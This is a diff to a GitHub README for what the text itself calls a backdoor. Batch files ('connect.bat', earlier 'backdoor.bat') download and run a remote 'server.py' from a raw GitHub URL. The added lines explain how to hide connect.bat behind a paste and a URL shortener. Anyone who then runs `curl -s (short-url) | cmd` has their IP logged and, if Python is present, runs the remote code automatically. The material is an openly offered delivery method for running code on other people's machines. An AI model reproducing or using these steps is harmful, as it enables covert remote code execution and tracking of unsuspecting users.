@@ -5,9 +5,13 @@ It's a complete garbage repo if you don't know what this is.
 
 ## Information
 
-The "connect.bat" file will connect to "backdoor.bat", the Batch file will execute the Python script named "server.py".
-You can clone the repo if you want, to connect to your server aka the Python script via command prompt; you can download the "connect.bat" file.
+The "connect.bat" file will be execute the code in "server.py"; in order to do the same, you need to clone the repo; copy the Raw URL of "server.py".
+After that, you'll need to replace the "https://raw.githubusercontent.com/snowyxxdev/cloud-server/refs/heads/main/server.py" in "connect.bat" with the copied Raw URL.
 
-You are able to change the server by cloning the repo on your GitHub, and changing the Raw URL in "backdoor.bat".
+You can create a paste containing the "connect.bat" contents, and use a URL shortener. Now, if you run the following command:
+`curl -s (short-url) | cmd`
+The IP Address will be logged, and provided from the URL shortener service (depending on which service).
+And, if they have Python installed; it'll automatically run the code in "server.py".
+
 
 ### Made by @snowyxxdev
